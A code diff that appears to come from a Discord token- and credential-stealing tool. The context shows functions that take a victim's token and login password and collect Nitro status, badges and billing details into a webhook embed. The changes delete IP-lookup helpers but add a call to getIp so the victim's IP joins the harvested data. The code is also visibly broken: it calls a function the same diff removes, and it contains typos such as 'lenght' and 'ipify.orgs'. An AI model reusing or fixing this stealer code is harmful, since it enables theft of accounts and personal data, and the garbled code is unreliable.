@@ -490,25 +490,6 @@ const fetchBilling = async (token) => {
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
-const fetchIp = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "https://api.ipify.orgs", false);
-    xmlHttp.send(null);
-    xmlHttp.responseText`);
-  return JSON.parse(bill);
-};
-
-const getIp = async (token) => {
-  const data = await fetchBilling(token);
-  let ip = "";
-  data.forEach((x) => {
-    if (!x.invalid) {
-      ip += x.ip
-    }
-  });
-  return ip;
-};
-
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
   if (!data) return '❌';
@@ -670,6 +651,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const ip = await getIp(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
